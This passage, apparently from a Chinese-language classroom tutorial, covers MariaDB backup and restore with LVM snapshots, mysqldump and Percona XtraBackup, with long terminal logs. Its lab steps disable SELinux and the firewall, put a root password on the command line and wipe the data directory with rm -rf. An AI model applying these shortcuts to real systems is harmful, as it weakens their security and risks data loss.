unconfined_u:object_r:unlabeled_t:s0 db1-rw-rw----. mysql mysql unconfined_u:object_r:unlabeled_t:s0 ibdata1-rw-rw----. mysql mysql unconfined_u:object_r:unlabeled_t:s0 ib_logfile0-rw-rw----. mysql mysql unconfined_u:object_r:unlabeled_t:s0 ib_logfile1drwx------. root root system_u:object_r:unlabeled_t:s0 lost+founddrwx------. mysql mysql unconfined_u:object_r:unlabeled_t:s0 mysqlsrwxrwxrwx. mysql mysql system_u:object_r:unlabeled_t:s0 mysql.sockdrwx------. mysql mysql unconfined_u:object_r:unlabeled_t:s0 performance_schemadrwx------. mysql mysql unconfined_u:object_r:unlabeled_t:s0 test# lvm快照备份MariaDB [(none)]&gt; flush tables with read lock;Query OK, 0 rows affected (0.00 sec)## 数据库加上全局读锁后，立刻在新终端中创建快照[root@mastera0 ~]# lvcreate -s -L 500M -n snap1 /dev/vgmysql/lv1 Logical volume &quot;snap1&quot; created.## 快照创建之后，解锁，服务可以正常适用了MariaDB [(none)]&gt; unlock tables;Query OK, 0 rows affected (0.00 sec)## 挂接快照使用[root@mastera0 ~]# mount /dev/vgmysql/snap1 /mnt[root@mastera0 ~]# ls /mntaria_log.00000001 db1 ib_logfile0 lost+found mysql.sock testaria_log_control ibdata1 ib_logfile1 mysql performance_schema[root@mastera0 ~]# cd /mnt[root@mastera0 mnt]# tar -cf /tmp/mysql.2.tar ./*tar: ./mysql.sock: socket ignored[root@mastera0 mnt]# ll /tmptotal 89316drwxr-xr-x. 2 root root 6 Aug 30 11:31 a-rw-r--r--. 1 root root 30484480 Aug 30 14:01 mysql.1.tar-rw-r--r--. 1 root root 30484480 Aug 30 14:58 mysql.2.tar-rw-r--r--. 1 root root 30484480 Aug 30 11:28 mysql.all.tar[root@mastera0 mnt]# cd[root@mastera0 ~]# umount /mnt[root@mastera0 ~]# lvlvchange lvdisplay lvmchange lvmdiskscan lvmpolld lvreduce lvresizelvconvert lvextend lvmconf lvmdump lvmsadc lvremove lvslvcreate lvm lvmconfig lvmetad lvmsar lvrename lvscan[root@mastera0 ~]# lvremove /dev/vgmysql/snap1Do you really want to remove active logical volume snap1? [y/n]: y Logical volume &quot;snap1&quot; successfully removed# 还原数据[root@mastera0 ~]# systemctl stop mariadb[root@mastera0 ~]# rm -rf /var/lib/mysql/*[root@mastera0 ~]# tar -xf /tmp/mysql.2.tar -C /var/lib/mysql[root@mastera0 ~]# ll /var/lib/mysqltotal 28712-rw-rw----. 1 mysql mysql 16384 Aug 30 14:01 aria_log.00000001-rw-rw----. 1 mysql mysql 52 Aug 30 14:01 aria_log_controldrwx------. 2 mysql mysql 4096 Aug 30 11:24 db1-rw-rw----. 1 mysql mysql 18874368 Aug 30 14:42 ibdata1-rw-rw----. 1 mysql mysql 5242880 Aug 30 14:42 ib_logfile0-rw-rw----. 1 mysql mysql 5242880 Aug 30 11:23 ib_logfile1drwx------. 2 root root 4096 Aug 30 13:57 lost+founddrwx------. 2 mysql mysql 4096 Aug 30 11:23 mysqldrwx------. 2 mysql mysql 4096 Aug 30 11:23 performance_schemadrwx------. 2 mysql mysql 4096 Aug 30 11:23 test[root@mastera0 ~]# systemctl start mariadb[root@mastera0 ~]# echo &quot;select * from db1.t1&quot; | mysql -uroot -puplookingid12 mysqldump逻辑备份和物理备份各有优缺点,逻辑备份保存的是 SQL 文本,可以在各种条件下恢复,但是对于大数据量的系统,备份和恢复的时间都比较长;物理备份恰恰相反,由于是文件的物理 cp,备份和恢复时间都比较短,但是备份的文件在不同的平台上不一定兼容。其中,mysqldump 是最常用的逻辑备份工具,适合各种存储引擎,希望大家重点掌握。 MyISAM和INNODB表的备份 存储引擎 数据一致 服务可用 实现方式 MYISAM ok no 锁表 INNODB ok ok MVCC mysqldump命令的用法12345678mysqldump 备份数据---逻辑备份sql语句 -u 用户名 -p 密码 -A 所有的库 --single-transaction INNODB存储引擎的表备份时能够做到数据一致，服务可用mysqldump -uroot -puplooking -A --single-transaction &gt; /tmp/mysql.201608301600.sql --lock-all-tables MYISAM存储引擎的表备份时能够做到数据一致，服务不可用mysqldump -uroot -puplooking -A --lock-all-tables &gt; /tmp/mysql.xxx.sql mysqldump备份步骤INNODB mysqldump -uroot -puplooking -A --single-transaction &gt; /tmp/mysql.201608301600.sql MYISAM mysqldump -uroot -puplooking -A --lock-all-tables &gt; /tmp/mysql.xxx.sqlmysqldump还原步骤1234561）停止服务2）清空环境3）启动服务4）导入数据5）刷新授权6）测试 课堂实战3: 利用mysqldump实现逻辑备份并还原123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990[root@mastera0 ~]# mysqldump -uroot -puplooking -A --single-transaction &gt; /tmp/mysql.all.1.sql[root@mastera0 ~]# ll /tmptotal 89820drwxr-xr-x. 2 root root 6 Aug 30 11:31 a-rw-r--r--. 1 root root 30484480 Aug 30 14:01 mysql.1.tar-rw-r--r--. 1 root root 30484480 Aug 30 14:58 mysql.2.tar-rw-r--r--. 1 root root 515980 Aug 30 16:02 mysql.all.1.sql-rw-r--r--. 1 root root 30484480 Aug 30 11:28 mysql.all.tar[root@mastera0 ~]# systemctl stop mariadb[root@mastera0 ~]# rm -rf /var/lib/mysql/*[root@mastera0 ~]# ll /var/lib/mysqltotal 0[root@mastera0 ~]# systemctl start mariadb[root@mastera0 ~]# ll /var/lib/mysqltotal 28704-rw-rw----. 1 mysql mysql 16384 Aug 30 16:10 aria_log.00000001-rw-rw----. 1 mysql mysql 52 Aug 30 16:10 aria_log_control-rw-rw----. 1 mysql mysql 18874368 Aug 30 16:10 ibdata1-rw-rw----. 1 mysql mysql 5242880 Aug 30 16:10 ib_logfile0-rw-rw----. 1 mysql mysql 5242880 Aug 30 16:10 ib_logfile1drwx------. 2 mysql mysql 4096 Aug 30 16:10 mysqlsrwxrwxrwx. 1 mysql mysql 0 Aug 30 16:10 mysql.sockdrwx------. 2 mysql mysql 4096 Aug 30 16:10 performance_schemadrwx------. 2 mysql mysql 4096 Aug 30 16:10 test[root@mastera0 ~]# mysqlWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 2Server version: 5.5.44-MariaDB MariaDB ServerCopyright (c) 2000, 2015, Oracle, MariaDB Corporation Ab and others.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.MariaDB [(none)]&gt; \\qBye[root@mastera0 ~]#[root@mastera0 ~]# mysql &lt; /tmp/mysql.all.1.sql[root@mastera0 ~]# mysqlWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 4Server version: 5.5.44-MariaDB MariaDB ServerCopyright (c) 2000, 2015, Oracle, MariaDB Corporation Ab and others.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.MariaDB [(none)]&gt; flush privileges;Query OK, 0 rows affected (0.00 sec)MariaDB [(none)]&gt; \\qBye[root@mastera0 ~]# mysqlERROR 1045 (28000): Access denied for user \\&apos;root\\&apos;@\\&apos;localhost\\&apos; (using password: NO)[root@mastera0 ~]# mysql -uroot -puplookingWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 6Server version: 5.5.44-MariaDB MariaDB ServerCopyright (c) 2000, 2015, Oracle, MariaDB Corporation Ab and others.Type \\&apos;help;\\&apos; or \\&apos;\\h\\&apos; for help. Type \\&apos;\\c\\&apos; to clear the current input statement.MariaDB [(none)]&gt; select * from db1.t1;+----+| id |+----+| 1 || 2 || 3 |+----+3 rows in set (0.00 sec)MariaDB [(none)]&gt; show databases;+---------------------+| Database |+---------------------+| information_schema || db1 || db2 || #mysql50#lost+found || mysql || performance_schema || test |+---------------------+7 rows in set (0.00 sec)MariaDB [(none)]&gt; exitPercona Xtrabackup 如何获取软件？ [Percona官网](www.percona.com) 教室环境已经下载好软件，存放路径为： http://classroom.example.com/content/MYSQL/04-others/soft/Percona-XtraBackup-2.3.4-re80c779-el7-x86_64-bundle.tar 缺少libev.so.4()(64bit) http://classroom.example.com/content/MYSQL/04-others/soft/libev-4.15-6.el7.x86_64.rpm install libev-4.15-6.el7.x86_64.rpm # install percona-xtrabackup-2.3.4-1.el7.x86_64.rpm # install percona-xtrabackup-2.3.4-1.el7.x86_64.rpm 查看软件架构 软件名 percona-xtrabackup 命令 innobackupex 选项 –user=name 用户名 —-password=name 密码 –apply-log 重演回滚 –copy-back 还原数据 –redo-only 只重演不回滚，与apply-log同时使用 示例1-全备份并还原 全备份 innobackupex –user=root –password=uplooking /tmp/backup 还原全备份 innobackupex –apply-log /tmp/backup/2016—– innobackupex --copy-back /tmp/backup/2016-----123456781）停止服务2）请环境3）导入数据 1&gt; apply-log 2&gt; copy-back4）修改权限5）启动服务6）测试 示例2-全备增备并还原 1234567891011全备份 innobackupex --user=root --password=uplooking /tmp/backup增量备份1 innobackupex --user=root --password=uplooking --incremental-basedir=/tmp/backup/2016-09-01_11-32-43 --incremental /tmp/backup增量备份2 innobackupex --user=root --password=uplooking --incremental-basedir= --incremental增量备份3 innobackupex --user=root --password=uplooking --incremental-basedir= --incremental全备份还原 innobackupex --apply-log --redo-only /tmp/backup/全备份 innobackupex --apply-log --redo-only /tmp/backup/全备份 --incremental-dir=增量1 innobackupex --apply-log --redo-only /tmp/backup/全备份 --incremental-dir=增量2 innobackupex --apply-log --redo-only /tmp/backup/全备份 --incremental-dir=增量3 innobackupex --apply-log /tmp/backup/全备份 innobackupex --copy-back /tmp/backup/全备份 课堂实战4：innobackupex实时增量备份和还原123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746747748749750751752753754755756757758759760761762763764765766767768769770771772773774775776777778779780781782783784785786787788789790791792793794795796797798799800801802803804805806807808809810811812813814815816817818819820821822823824825826827828829830831832833834835836837838839840841842843844845846847848849850851852853854855856857858859860861862863864865866867868869870871872873874875876877878879880881882883884885886887888889890891892893894895896897898899900901902903904905906907908909910911912913914915916917918919920921922923924925926927928929930931932933934935936937938939## install[root@mastera0 ~]# setenforce 0[root@mastera0 ~]# systemctl stop firewalld[root@mastera0 ~]# wget http://classroom.example.com/content/MYSQL/04-others/soft/Percona-XtraBackup-2.3.4-re80c779-el7-x86_64-bundle.tar--2016-09-01 10:41:05-- http://classroom.example.com/content/MYSQL/04-others/soft/Percona-XtraBackup-2.3.4-re80c779-el7-x86_64-bundle.tarReusing existing connection to classroom.example.com:80.HTTP request sent, awaiting response... 200 OKLength: 25548800 (24M) [application/x-tar]Saving to: ‘Percona-XtraBackup-2.3.4-re80c779-el7-x86_64-bundle.tar’100%[===========================================&gt;] 25,548,800 122MB/s in 0.2s 2016-09-01 10:41:05 (122 MB/s) - ‘Percona-XtraBackup-2.3.4-re80c779-el7-x86_64-bundle.tar’ saved [25548800/25548800]FINISHED --2016-09-01 10:41:05--Total wall clock time: 0.3sDownloaded: 1 files, 24M in 0.2s (122 MB/s)[root@mastera0 ~]# lsanaconda-ks.cfg Percona-XtraBackup-2.3.4-re80c779-el7-x86_64-bundle.tar[root@mastera0 ~]# tar -xf Percona-XtraBackup-2.3.4-re80c779-el7-x86_64-bundle.tar[root@mastera0 ~]# lsanaconda-ks.cfgpercona-xtrabackup-2.3.4-1.el7.x86_64.rpmPercona-XtraBackup-2.3.4-re80c779-el7-x86_64-bundle.tarpercona-xtrabackup-debuginfo-2.3.4-1.el7.x86_64.rpmpercona-xtrabackup-test-2.3.4-1.el7.x86_64.rpm[root@mastera0 ~]# yum localinstall -y percona-xtrabackupLoaded plugins: product-id, search-disabled-repos, subscription-managerThis system is not registered to Red Hat Subscription Management. You can use subscription-manager to register.Skipping: percona-xtrabackup, filename does not end in .rpm.Nothing to do[root@mastera0 ~]# yum localinstall -y percona-xtrabackup-2.3.4-1.el7.x86_64.rpmLoaded plugins: product-id, search-disabled-repos, subscription-managerThis system is not registered to Red Hat Subscription Management. You can use subscription-manager to register.Examining percona-xtrabackup-2.3.4-1.el7.x86_64.rpm: percona-xtrabackup-2.3.4-1.el7.x86_64Marking percona-xtrabackup-2.3.4-1.el7.x86_64.rpm to be installedResolving Dependencies--&gt; Running transaction check---&gt; Package percona-xtrabackup.x86_64 0:2.3.4-1.el7 will be installed--&gt; Processing Dependency: rsync for package: percona-xtrabackup-2.3.4-1.el7.x86_64rhel_dvd | 4.1 kB 00:00:00 --&gt; Processing Dependency: libev.so.4()(64bit) for package: percona-xtrabackup-2.3.4-1.el7.x86_64--&gt; Running transaction check---&gt; Package percona-xtrabackup.x86_64 0:2.3.4-1.el7 will be installed--&gt; Processing Dependency: libev.so.4()(64bit) for package: percona-xtrabackup-2.3.4-1.el7.x86_64---&gt; Package rsync.x86_64 0:3.0.9-17.el7 will be installed--&gt; Finished Dependency ResolutionError: Package: percona-xtrabackup-2.3.4-1.el7.x86_64 (/percona-xtrabackup-2.3.4-1.el7.x86_64) Requires: libev.so.4()(64bit) You could try using --skip-broken to work around the problem You could try running: rpm -Va --nofiles --nodigest[root@mastera0 ~]# wget http://classroom.example.com/content/MYSQL/04-others/soft/libev-4.15-6.el7.x86_64.rpm--2016-09-01 10:43:37-- http://classroom.example.com/content/MYSQL/04-others/soft/libev-4.15-6.el7.x86_64.rpmResolving classroom.example.com (classroom.example.com)... 172.25.254.254Connecting to classroom.example.com (classroom.example.com)|172.25.254.254|:80... connected.HTTP request sent, awaiting response... 200 OKLength: 44964 (44K) [application/x-rpm]Saving to: ‘libev-4.15-6.el7.x86_64.rpm’100%[===========================================&gt;] 44,964 --.-K/s in 0s 2016-09-01 10:43:37 (360 MB/s) - ‘libev-4.15-6.el7.x86_64.rpm’ saved [44964/44964][root@mastera0 ~]# lsanaconda-ks.cfglibev-4.15-6.el7.x86_64.rpmpercona-xtrabackup-2.3.4-1.el7.x86_64.rpmPercona-XtraBackup-2.3.4-re80c779-el7-x86_64-bundle.tarpercona-xtrabackup-debuginfo-2.3.4-1.el7.x86_64.rpmpercona-xtrabackup-test-2.3.4-1.el7.x86_64.rpm[root@mastera0 ~]# yum localinstall -y libev-4.15-6.el7.x86_64.rpmLoaded plugins: product-id, search-disabled-repos, subscription-managerThis system is not registered to Red Hat Subscription Management. You can use subscription-manager to register.Examining libev-4.15-6.el7.x86_64.rpm: libev-4.15-6.el7.x86_64Marking libev-4.15-6.el7.x86_64.rpm to be installedResolving Dependencies--&gt; Running transaction check---&gt; Package libev.x86_64 0:4.15-6.el7 will be installed--&gt; Finished Dependency ResolutionDependencies Resolved===================================================================================== Package Arch Version Repository Size=====================================================================================Installing: libev x86_64 4.15-6.el7 /libev-4.15-6.el7.x86_64 86 kTransaction Summary=====================================================================================Install 1 PackageTotal size: 86 kInstalled size: 86 kDownloading packages:Running transaction checkRunning transaction testTransaction test succeededRunning transaction Installing : libev-4.15-6.el7.x86_64 1/1 Verifying : libev-4.15-6.el7.x86_64 1/1Installed: libev.x86_64 0:4.15-6.el7 Complete![root@mastera0 ~]# yum localinstall -y percona-xtrabackup-2.3.4-1.el7.x86_64.rpm Loaded plugins: product-id, search-disabled-repos, subscription-managerThis system is not registered to Red Hat Subscription Management. You can use subscription-manager to register.Examining percona-xtrabackup-2.3.4-1.el7.x86_64.rpm: percona-xtrabackup-2.3.4-1.el7.x86_64Marking percona-xtrabackup-2.3.4-1.el7.x86_64.rpm to be installedResolving Dependencies--&gt; Running transaction check---&gt; Package percona-xtrabackup.x86_64 0:2.3.4-1.el7 will be installed--&gt; Processing Dependency: rsync for package: percona-xtrabackup-2.3.4-1.el7.x86_64--&gt; Running transaction check---&gt; Package rsync.x86_64 0:3.0.9-17.el7 will be installed--&gt; Finished Dependency ResolutionDependencies Resolved===================================================================================== Package Arch Version Repository Size=====================================================================================Installing: percona-xtrabackup x86_64 2.3.4-1.el7 /percona-xtrabackup-2.3.4-1.el7.x86_64 21 MInstalling for dependencies: rsync x86_64 3.0.9-17.el7 rhel_dvd 359 kTransaction Summary=====================================================================================Install 1 Package (+1 Dependent package)Total size: 22 MTotal download size: 359 kInstalled size: 22 MDownloading packages:rsync-3.0.9-17.el7.x86_64.rpm | 359 kB 00:00:00 Running transaction checkRunning transaction testTransaction test succeededRunning transaction Installing : rsync-3.0.9-17.el7.x86_64 1/2 Installing : percona-xtrabackup-2.3.4-1.el7.x86_64 2/2 Verifying : rsync-3.0.9-17.el7.x86_64 1/2 Verifying : percona-xtrabackup-2.3.4-1.el7.x86_64 2/2Installed: percona-xtrabackup.x86_64 0:2.3.4-1.el7 Dependency Installed: rsync.x86_64 0:3.0.9-17.el7 Complete![root@mastera0 ~]# lsanaconda-ks.cfglibev-4.15-6.el7.x86_64.rpmpercona-xtrabackup-2.3.4-1.el7.x86_64.rpmPercona-XtraBackup-2.3.4-re80c779-el7-x86_64-bundle.tarpercona-xtrabackup-debuginfo-2.3.4-1.el7.x86_64.rpmpercona-xtrabackup-test-2.3.4-1.el7.x86_64.rpm[root@mastera0 ~]# rpm -ql percona-xtrabackup/usr/bin/innobackupex/usr/bin/xbcloud/usr/bin/xbcloud_osenv/usr/bin/xbcrypt/usr/bin/xbstream/usr/bin/xtrabackup/usr/share/doc/percona-xtrabackup-2.3.4/usr/share/doc/percona-xtrabackup-2.3.4/COPYING/usr/share/man/man1/innobackupex.1.gz/usr/share/man/man1/xbcrypt.1.gz/usr/share/man/man1/xbstream.1.gz/usr/share/man/man1/xtrabackup.1.gz## backup[root@mastera0 mysql-log]# innobackupex --user=root --password=uplooking /tmp/backup160901 11:32:43 innobackupex: Starting the backup operationIMPORTANT: Please check that the backup run completes successfully. At the end of a successful backup run innobackupex prints \\&quot;completed OK!\\&quot;.Can\\&apos;t locate Digest/MD5.pm in @INC (@INC contains: /usr/local/lib64/perl5 /usr/local/share/perl5 /usr/lib64/perl5/vendor_perl /usr/share/perl5/vendor_perl /usr/lib64/perl5 /usr/share/perl5 .) at - line 693.BEGIN failed--compilation aborted at - line 693.160901 11:32:43 Connecting to MySQL server host: localhost, user: root, password: set, port: 0, socket: /var/lib/mysql/mysql.sockUsing server version 5.5.44-MariaDB-loginnobackupex version 2.3.4 based on MySQL server 5.6.24 Linux (x86_64) (revision id: e80c779)xtrabackup: uses posix_fadvise().xtrabackup: cd to /var/lib/mysqlxtrabackup: open files limit requested 0, set to 1024xtrabackup: using the following InnoDB configuration:xtrabackup: innodb_data_home_dir = ./xtrabackup: innodb_data_file_path = ibdata1:10M:autoextendxtrabackup: innodb_log_group_home_dir = ./xtrabackup: innodb_log_files_in_group = 2xtrabackup: innodb_log_file_size = 5242880160901 11:32:43 &gt;&gt; log scanned up to (1607773)xtrabackup: Generating a list of tablespaces160901 11:32:43 [01] Copying ./ibdata1 to /tmp/backup/2016-09-01_11-32-43/ibdata1160901 11:32:43 [01] ...done160901 11:32:44 &gt;&gt; log scanned up to (1607773)160901 11:32:44 Executing FLUSH NO_WRITE_TO_BINLOG TABLES...160901 11:32:44 Executing FLUSH TABLES WITH READ LOCK...160901 11:32:44 Starting to backup non-InnoDB tables and files160901 11:32:44 [01] Copying ./mysql/tables_priv.frm to /tmp/backup/2016-09-01_11-32-43/mysql/tables_priv.frm160901 11:32:44 [01] ...done160901 11:32:44 [01] Copying ./mysql/tables_priv.MYI to /tmp/backup/2016-09-01_11-32-43/mysql/tables_priv.MYI160901 11:32:44 [01] ...done160901 11:32:44 [01] Copying ./mysql/time_zone.MYD to /tmp/backup/2016-09-01_11-32-43/mysql/time_zone.MYD160901 11:32:44 [01] ...done160901 11:32:44 [01] Copying ./mysql/ndb_binlog_index.MYD to /tmp/backup/2016-09-01_11-32-43/mysql/ndb_binlog_index.MYD160901 11:32:44 [01] ...done160901 11:32:44 [01] Copying ./mysql/plugin.MYD to /tmp/backup/2016-09-01_11-32-43/mysql/plugin.MYD160901 11:32:44 [01] ...done160901 11:32:44 [01] Copying ./mysql/proc.MYI to /tmp/backup/2016-09-01_11-32-43/mysql/proc.MYI160901 11:32:44 [01] ...done160901 11:32:44 [01] Copying ./mysql/procs_priv.frm to /tmp/backup/2016-09-01_11-32-43/mysql/procs_priv.frm160901 11:32:44 [01] ...done160901 11:32:44 [01] Copying ./mysql/procs_priv.MYD to /tmp/backup/2016-09-01_11-32-43/mysql/procs_priv.MYD160901 11:32:44 [01] ...done160901 11:32:45 [01] Copying ./mysql/proxies_priv.MYI to /tmp/backup/2016-09-01_11-32-43/mysql/proxies_priv.MYI160901 11:32:45 [01] ...done160901 11:32:45 [01] Copying ./mysql/servers.frm to /tmp/backup/2016-09-01_11-32-43/mysql/servers.frm160901 11:32:45 [01] ...done160901 11:32:45 [01] Copying ./mysql/servers.MYD to /tmp/backup/2016-09-01_11-32-43/mysql/servers.MYD160901 11:32:45 [01] ...done160901 11:32:45 [01] Copying ./mysql/time_zone.MYI to /tmp/backup/2016-09-01_11-32-43/mysql/time_zone.MYI160901 11:32:45 [01] ...done160901 11:32:45 [01] Copying ./mysql/time_zone_name.frm to /tmp/backup/2016-09-01_11-32-43/mysql/time_zone_name.frm160901 11:32:45 [01] ...done160901 11:32:45 [01] Copying ./mysql/time_zone_name.MYI to /tmp/backup/2016-09-01_11-32-43/mysql/time_zone_name.MYI160901 11:32:45 [01] ...done160901 11:32:45 [01] Copying ./mysql/time_zone_name.MYD to /tmp/backup/2016-09-01_11-32-43/mysql/time_zone_name.MYD160901 11:32:45 [01] ...done160901 11:32:45 [01] Copying ./mysql/time_zone_transition.frm to /tmp/backup/2016-09-01_11-32-43/mysql/time_zone_transition.frm160901 11:32:45 [01] ...done160901 11:32:45 [01] Copying ./mysql/time_zone_transition.MYI to /tmp/backup/2016-09-01_11-32-43/mysql/time_zone_transition.MYI160901 11:32:45 [01] ...done160901 11:32:45 &gt;&gt; log scanned up to (1607773)160901 11:32:45 [01] Copying ./mysql/time_zone_transition.MYD to /tmp/backup/2016-09-01_11-32-43/mysql/time_zone_transition.MYD160901 11:32:45 [01] ...done160901 11:32:45 [01] Copying ./mysql/time_zone_transition_type.frm to /tmp/backup/2016-09-01_11-32-43/mysql/time_zone_transition_type.frm160901 11:32:45 [01] ...done160901 11:32:45 [01] Copying ./mysql/time_zone_transition_type.MYI to /tmp/backup/2016-09-01_11-32-43/mysql/time_zone_transition_type.MYI160901 11:32:45 [01] ...done160901 11:32:45 [01] Copying ./mysql/time_zone_transition_type.MYD to /tmp/backup/2016-09-01_11-32-43/mysql/time_zone_transition_type.MYD160901 11:32:45 [01] ...done160901 11:32:45 [01] Copying ./mysql/user.frm to /tmp/backup/2016-09-01_11-32-43/mysql/user.frm160901 11:32:45 [01] ...done160901 11:32:45 [01] Copying ./mysql/user.MYI to /tmp/backup/2016-09-01_11-32-43/mysql/user.MYI160901 11:32:45 [01] ...done160901 11:32:45 [01] Copying ./mysql/user.MYD to /tmp/backup/2016-09-01_11-32-43/mysql/user.MYD160901 11:32:45 [01] ...done160901 11:32:45 [01] Copying ./mysql/time_zone_leap_second.frm to /tmp/backup/2016-09-01_11-32-43/mysql/time_zone_leap_second.frm160901 11:32:45 [01] ...done160901 11:32:45 [01] Copying ./mysql/time_zone_leap_second.MYI to /tmp/backup/2016-09-01_11-32-43/mysql/time_zone_leap_second.MYI160901 11:32:45 [01] ...done160901 11:32:45 [01] Copying ./mysql/general_log.frm to /tmp/backup/2016-09-01_11-32-43/mysql/general_log.frm160901 11:32:45 [01] ...done160901 11:32:45 [01] Copying ./mysql/general_log.CSM to /tmp/backup/2016-09-01_11-32-43/mysql/general_log.CSM160901 11:32:45 [01] ...done160901 11:32:46 [01] Copying ./mysql/general_log.CSV to /tmp/backup/2016-09-01_11-32-43/mysql/general_log.CSV160901 11:32:46 [01] ...done160901 11:32:46 [01] Copying ./mysql/slow_log.frm to /tmp/backup/2016-09-01_11-32-43/mysql/slow_log.frm160901 11:32:46 [01] ...done160901 11:32:46 [01] Copying ./mysql/slow_log.CSM to /tmp/backup/2016-09-01_11-32-43/mysql/slow_log.CSM160901 11:32:46 [01] ...done160901 11:32:46 [01] Copying ./mysql/slow_log.CSV to /tmp/backup/2016-09-01_11-32-43/mysql/slow_log.CSV160901 11:32:46 [01] ...done160901 11:32:46 [01] Copying ./mysql/tables_priv.MYD to /tmp/backup/2016-09-01_11-32-43/mysql/tables_priv.MYD160901 11:32:46 [01] ...done160901 11:32:46 [01] Copying ./mysql/columns_priv.frm to /tmp/backup/2016-09-01_11-32-43/mysql/columns_priv.frm160901 11:32:46 [01] ...done160901 11:32:46 [01] Copying ./mysql/columns_priv.MYI to /tmp/backup/2016-09-01_11-32-43/mysql/columns_priv.MYI160901 11:32:46 [01] ...done160901 11:32:46 [01] Copying ./mysql/columns_priv.MYD to /tmp/backup/2016-09-01_11-32-43/mysql/columns_priv.MYD160901 11:32:46 [01] ...done160901 11:32:46 [01] Copying ./mysql/db.frm to /tmp/backup/2016-09-01_11-32-43/mysql/db.frm160901 11:32:46 [01] ...done160901 11:32:46 [01] Copying ./mysql/db.MYI to /tmp/backup/2016-09-01_11-32-43/mysql/db.MYI160901 11:32:46 [01] ...done160901 11:32:46 [01] Copying ./mysql/db.MYD to /tmp/backup/2016-09-01_11-32-43/mysql/db.MYD160901 11:32:46 [01] ...done160901 11:32:46 &gt;&gt; log scanned up to (1607773)160901 11:32:46 [01] Copying ./mysql/event.frm to /tmp/backup/2016-09-01_11-32-43/mysql/event.frm160901 11:32:46 [01] ...done160901 11:32:46 [01] Copying ./mysql/event.MYI to /tmp/backup/2016-09-01_11-32-43/mysql/event.MYI160901 11:32:46 [01] ...done160901 11:32:46 [01] Copying ./mysql/event.MYD to /tmp/backup/2016-09-01_11-32-43/mysql/event.MYD160901 11:32:46 [01] ...done160901 11:32:46 [01] Copying ./mysql/func.frm to /tmp/backup/2016-09-01_11-32-43/mysql/func.frm160901 11:32:46 [01] ...done160901 11:32:46 [01] Copying ./mysql/func.MYI to /tmp/backup/2016-09-01_11-32-43/mysql/func.MYI160901 11:32:46 [01] ...done160901 11:32:46 [01] Copying ./mysql/func.MYD to /tmp/backup/2016-09-01_11-32-43/mysql/func.MYD160901 11:32:46 [01] ...done160901 11:32:46 [01] Copying ./mysql/help_category.frm to /tmp/backup/2016-09-01_11-32-43/mysql/help_category.frm160901 11:32:46 [01] ...done160901 11:32:46 [01] Copying ./mysql/help_category.MYI to /tmp/backup/2016-09-01_11-32-43/mysql/help_category.MYI160901 11:32:46 [01] ...done160901 11:32:46 [01] Copying ./mysql/help_category.MYD to /tmp/backup/2016-09-01_11-32-43/mysql/help_category.MYD160901 11:32:46 [01] ...done160901 11:32:46 [01] Copying ./mysql/help_keyword.frm to /tmp/backup/2016-09-01_11-32-43/mysql/help_keyword.frm160901 11:32:46 [01] ...done160901 11:32:47 [01] Copying ./mysql/help_keyword.MYI to /tmp/backup/2016-09-01_11-32-43/mysql/help_keyword.MYI160901 11:32:47 [01] ...done160901 11:32:47 [01] Copying ./mysql/help_keyword.MYD to /tmp/backup/2016-09-01_11-32-43/mysql/help_keyword.MYD160901 11:32:47 [01] ...done160901 11:32:47 [01] Copying ./mysql/help_relation.frm to /tmp/backup/2016-09-01_11-32-43/mysql/help_relation.frm160901 11:32:47 [01] ...done160901 11:32:47 [01] Copying ./mysql/help_relation.MYI to /tmp/backup/2016-09-01_11-32-43/mysql/help_relation.MYI160901 11:32:47 [01] ...done160901 11:32:47 [01] Copying ./mysql/help_relation.MYD to /tmp/backup/2016-09-01_11-32-43/mysql/help_relation.MYD160901 11:32:47 [01] ...done160901 11:32:47 [01] Copying ./mysql/help_topic.frm to /tmp/backup/2016-09-01_11-32-43/mysql/help_topic.frm160901 11:32:47 [01] ...done160901 11:32:47 [01] Copying ./mysql/help_topic.MYI to /tmp/backup/2016-09-01_11-32-43/mysql/help_topic.MYI160901 11:32:47 [01] ...done160901 11:32:47 &gt;&gt; log scanned up to (1607773)160901 11:32:47 [01] Copying ./mysql/help_topic.MYD to /tmp/backup/2016-09-01_11-32-43/mysql/help_topic.MYD160901 11:32:47 [01] ...done160901 11:32:47 [01] Copying ./mysql/host.frm to /tmp/backup/2016-09-01_11-32-43/mysql/host.frm160901 11:32:47 [01] ...done160901 11:32:47 [01] Copying ./mysql/host.MYI to /tmp/backup/2016-09-01_11-32-43/mysql/host.MYI160901 11:32:47 [01] ...done160901 11:32:47 [01] Copying ./mysql/host.MYD to /tmp/backup/2016-09-01_11-32-43/mysql/host.MYD160901 11:32:47 [01] ...done160901 11:32:47 [01] Copying ./mysql/ndb_binlog_index.frm to 